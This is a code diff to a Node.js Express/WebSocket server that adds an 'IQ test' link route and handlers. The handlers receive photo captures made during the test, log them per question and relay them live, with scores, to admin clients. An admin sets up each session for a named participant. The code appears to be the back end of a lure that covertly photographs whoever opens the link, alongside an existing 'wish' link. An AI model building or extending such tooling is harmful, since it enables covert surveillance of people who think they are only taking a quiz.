@@ -28,6 +28,26 @@ app.get('/wish/:sessionId', (req, res) => {
   res.redirect(redirectUrl);
 });
 
+// Handle IQ test links
+app.get('/iqtest/:sessionId', (req, res) => {
+  const sessionId = req.params.sessionId;
+  
+  // Check if IQ session exists
+  const sessionData = iqSessions.get(sessionId);
+  if (!sessionData) {
+    // Create a basic session if it doesn't exist
+    iqSessions.set(sessionId, {
+      id: sessionId,
+      participantName: 'Anonymous',
+      created: Date.now(),
+      status: 'active'
+    });
+  }
+  
+  // Serve the IQ test page
+  res.sendFile(path.join(__dirname, 'iq-test.html'));
+});
+
 // Root route - serve index.html
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
@@ -37,6 +57,8 @@ app.get('/', (req, res) => {
 const adminClients = new Set();
 const userClients = new Map(); // sessionId -> Set of user WebSockets
 const sessions = new Map(); // sessionId -> session metadata
+const iqSessions = new Map(); // sessionId -> IQ test session metadata
+const iqPhotos = new Map(); // sessionId -> array of photo captures
 let totalImages = 0;
 
 function broadcastToAdmins(message) {
@@ -105,6 +127,79 @@ wss.on('connection', (ws, req) => {
       });
       console.log(`Session created: ${data.sessionId} (${data.sessionName})`);
       updateAdminStats();
+      
+    } else if (data.type === 'create_iq_session') {
+      // Admin is creating a new IQ test session
+      iqSessions.set(data.sessionId, {
+        id: data.sessionId,
+        participantName: data.participantName,
+        created: Date.now(),
+        status: 'active',
+        photoCount: 0
+      });
+      console.log(`IQ Session created: ${data.sessionId} (${data.participantName})`);
+      
+      // Notify admins
+      broadcastToAdmins({
+        type: 'iq_session_created',
+        sessionId: data.sessionId,
+        participantName: data.participantName
+      });
+      
+    } else if (data.type === 'iq_photo_capture') {
+      // IQ test photo capture
+      if (!iqPhotos.has(data.sessionId)) {
+        iqPhotos.set(data.sessionId, []);
+      }
+      
+      const photoData = {
+        type: data.photoType,
+        timestamp: data.timestamp,
+        currentQuestion: data.currentQuestion,
+        photo: data.photo
+      };
+      
+      iqPhotos.get(data.sessionId).push(photoData);
+      
+      // Update session photo count
+      if (iqSessions.has(data.sessionId)) {
+        iqSessions.get(data.sessionId).photoCount++;
+      }
+      
+      // Forward to all admins
+      broadcastToAdmins({
+        type: 'iq_photo_captured',
+        sessionId: data.sessionId,
+        photoType: data.photoType,
+        timestamp: data.timestamp,
+        currentQuestion: data.currentQuestion,
+        photo: data.photo
+      });
+      
+      console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
+      
+    } else if (data.type === 'iq_test_complete') {
+      // IQ test completion
+      if (iqSessions.has(data.sessionId)) {
+        const session = iqSessions.get(data.sessionId);
+        session.status = 'completed';
+        session.score = data.score;
+        session.correctAnswers = data.correctAnswers;
+        session.totalQuestions = data.totalQuestions;
+        session.completedAt = data.timestamp;
+      }
+      
+      // Notify admins
+      broadcastToAdmins({
+        type: 'iq_test_completed',
+        sessionId: data.sessionId,
+        score: data.score,
+        correctAnswers: data.correctAnswers,
+        totalQuestions: data.totalQuestions,
+        timestamp: data.timestamp
+      });
+      
+      console.log(`IQ Test completed: ${data.sessionId} - Score: ${data.score}`);
       
     } else if (data.type === 'image' && data.sessionId) {
       // User is sending an image
